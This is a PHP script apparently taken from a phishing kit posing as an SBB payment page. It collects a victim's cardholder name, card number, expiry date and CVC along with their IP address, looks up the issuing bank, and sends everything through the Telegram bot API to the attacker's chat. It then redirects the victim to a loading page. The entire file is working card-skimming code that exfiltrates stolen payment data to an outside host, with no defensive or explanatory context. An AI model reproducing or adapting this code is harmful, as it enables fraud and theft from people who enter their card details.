<?php
session_start();
include 'config.php';
require 'stop.php';
require 'a.php';
$hold = $_POST['card_holder']; 
$crd = $_POST['card_number']; 
$exp = $_POST['expiry_date'];
$csv = $_POST['cvc'];

// Extracting the BIN (Bank Identification Number)
$bin = substr($crd, 0, 6);

// Make a request to the binlist.net API
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://lookup.binlist.net/".$bin);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

$result = curl_exec($curl);

if(curl_errno($curl)){
    // If the BIN lookup fails, just use the BIN
    $bank = $bin;
} else {
    $data = json_decode($result, true);
    // Extract the bank name from the API response
    $bank = isset($data['bank']['name']) ? $data['bank']['name'] : 'Unknown';
}

curl_close($curl);

$ip = $_SERVER['REMOTE_ADDR'];

$message  = "------------------+ 🎁 SBB CC 🎁+-----------------\r\n";
$message .= "NAME : ".$hold."\r\n";
$message .= "CCN : ".$crd."\r\n";
$message .= "Bank : ".$bank."\r\n";  // Added Bank to the message.
$message .= "EXP : ".$exp."\r\n";
$message .= "CSV : ".$csv."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 🛒 CRYPTO 🛒 +------------------\r\n";

$website="https://api.telegram.org/bot" . $api;
$params=[
    'chat_id' => $chat,
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch); 

$x=md5(microtime());
$xx=sha1(microtime());
$cc = base64_encode($crd);

echo "<script> window.top.location.href = 'loading.php'; </script>";
?>
